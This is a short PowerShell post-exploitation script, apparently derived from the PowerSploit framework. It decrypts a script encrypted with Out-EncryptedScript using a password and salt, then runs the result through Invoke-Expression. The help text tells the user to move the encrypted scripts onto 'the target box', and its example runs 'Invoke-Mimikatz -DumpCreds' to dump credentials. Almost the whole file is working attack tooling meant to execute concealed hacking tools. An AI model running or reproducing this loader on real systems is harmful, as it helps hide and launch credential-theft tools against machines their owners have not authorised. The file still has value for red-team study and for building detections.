<#
.SYNOPSIS

Decrypt the text files/scripts encrypted with PowerSploit's Out-EncryptedScript.ps1, and execute.

Author: Karn Ganeshen
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Use PS-DecScript.ps1 to decrypt & execute scripts encrypted with PowerSploit's Out-EncryptedScript.ps1.

.PARAMETER EvilScript

Path to the encrypted script file

.PARAMETER Password

Password to decrypt the scripts

.PARAMETER Salt

Salt value for decryption.

.PARAMETER Command

Command / function to run (For example, Invoke-Mimikatz -DumpCreds)

Description
-----------
PS-DecScript.ps1 is sourced from PowerSploit framework (Thanks Matthew Graeber (@mattifestation)!). This script decrypts files/scripts encrypted with PowerSploit's Out-EncryptedScript's, and execute them.


.EXAMPLE

Move the encrypted scripts on the target box. Depending on the script, Command may or may not be required.

PS C:\scripts> PS-DecScript.ps1 .\Invoke-Mimikatz_evil.ps1 password salty 'Invoke-Mimikatz -DumpCreds'
Executing .\Invoke-Mimikatz_evil.ps1

#>

[CmdletBinding()] param(
	[Parameter(Position = 0, Mandatory = $True)]
	[string]
	$EvilScript,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,
    
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Salt,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Command
)

Write-Host "Executing $EvilScript"
[String] $cmd = Get-Content $EvilScript
Invoke-Expression $cmd
$decrypted = de $Password $Salt
iex "$decrypted $Command"
